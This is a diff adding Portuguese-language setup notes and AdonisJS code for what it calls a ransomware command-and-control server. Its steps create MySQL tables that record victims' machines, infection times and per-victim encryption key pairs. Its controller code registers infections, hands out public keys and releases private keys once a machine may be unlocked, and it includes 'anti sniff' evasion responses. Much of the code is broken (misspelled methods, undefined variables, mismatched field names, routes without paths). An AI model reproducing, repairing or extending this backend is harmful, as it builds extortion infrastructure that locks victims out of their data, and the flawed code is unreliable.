@@ -1,0 +1,157 @@
+## 1
+$npm i -g @adonisjs/cli
+$adonis new c2-server --api-only (app somente api)
+ransom-jeiesi/c2-server/helpers/index.js
+
+
+MODELO DE DADOS
+## 2 - criar um db com mysql
+
+mysql> create database c2_server; create user 'c2_server'@'localhost' 
+       identified with mysql_native_password by 'password'; grant all 
+       privileges on c2_server.* to 'c2_server'@'localhost';
+
+## 3 - no arquivo .env em ransom-jeiesi/c2-server/ alterar as envs
+DB_USER=c2_server
+DB_PASSWORD=password
+DB_DATABASE=c2_server
+DB_CONNECTION=mysql
+
+
+## 4 - instalar o client mysql p/ node (no dir do c2)
+
+$npm install --save mysql
+
+## 5 - criar models/migrations no dir do c2 
+
+$adonis make:model Client -m 
+$adonis make:model KeyPair -m 
+
+# no arquivo de migrations KeyPair adicionar:
+table.text("privateKey");
+table.text("publicKey");
+table.string("passphrase");
+table.integer("client_id").unsigned();
+table.foreing("client_id").references("id").inTable("clients");
+
+## no arquivo de migrations Client adiconar:
+table.string("uuid").unique();
+table.datetime("infection");
+table.json("user");
+table.json("os");
+table.boolean("locked").defaultTo(false);
+
+## 6 - instalar adonis jsonable no dir do c2
+ (pacote que ajuda o adonis trabalhar com json)
+$adonis install adonis-jsonable
+https://www.npmjs.com/package/adonis-jsonable
+
+# seguir instruções da pág ...
+
+## no arquivo models Client.js alterar e adicionar:
+
+get jsonFields() {
+       return ["user", "os"];  //campos do db q sao json
+}
+
+static get date() {
+       return ["create_at", "update_at", "infection"]  //conversao da data
+}
+
+keyPair() {
+       return this.hasOne["App/Models/KeyPair"];
+}
+
+
+## no arquivo models KeyPair.js adicionar:
+
+client() {
+       return this.belongsTo("App/Models/Client"); 
+}
+
+
+
+REGISTRO DE INFECÇÃO
+## - 7  criar adonis controller 
+
+$adonis make:controller Infection
+
+# no arquivo infectioncontroller.js em c2_server/controllers adicionar:
+
+const Client = use("App/Models/Client");
+const KeyPair = use("App/Models/KeyPair");
+const { generateKeyPair } = use("App/Helpers");
+
+async infection({ request, response }) {
+  const { uuid, infection, user, os } = request.all();
+  console.log("request infc: ", uuid);
+
+  try {
+     var clientExists = await Client.findBy("uuid", uuid);
+     // caso o cli exista, retorna a chv pub
+     if(clientExists){
+       const clientKeyPair = await KeyPair.findBy("client_id", clientExists.id);
+       const payload = {};
+       payload.publicKey = clientKeyPair.publicKey
+       return response.status(201).send(payload);
+     }
+
+      // caso nao exista, registra e gera um novo par de chv 
+      client = await Client.create({ uuid, infection, user, os });
+
+      var parChv = generateKeyPair();
+      parChv = await KeyPair.create({ ...parChv, client_id: client_id }); 
+
+      return response.status(201).send({ publicKey: parChaves.publicKey }); 
+  } catch (error) {
+    return reponse.status(204).send();
+
+  }
+
+}
+
+// checa as infecções
+
+async checkInf({ request, response }) {
+       const uuid = request.input("uuid");
+       if(!uuid){
+              return response.status(204).send({}); // anti sniff
+       }
+       console.log("request check: ", uuid);
+
+       //busca uuid no db e relaciona com Client.js
+       var client = await Client.query().with("keyPair").where("uuid", uuid).first(); 
+
+       if(!client){
+              return response.status(204).send(); // anti sniff
+       }
+
+       client = client.toJSON();
+
+       // verif se a map pode ser desbloc
+       if(!client.block){
+              return response.status(204).send(client.keyPair);
+       }
+
+       // se nao puder desbloc
+       return response.status(204).send();
+}
+
+
+## em c2_server/start/routers.js adicionar rotas:
+ 
+Route.post("InfectionController.infection"); 
+Route.get("InfectionController.checkInf");
+
+## em c2_server/config/cors.js alterar:
+
+origin:true,
+
+
+RUN SERVER
+## - 8 NO DIR do c2_server
+$adonis migration:refresh
+$adonis serve --dev 
+
+
+// -16-17-18
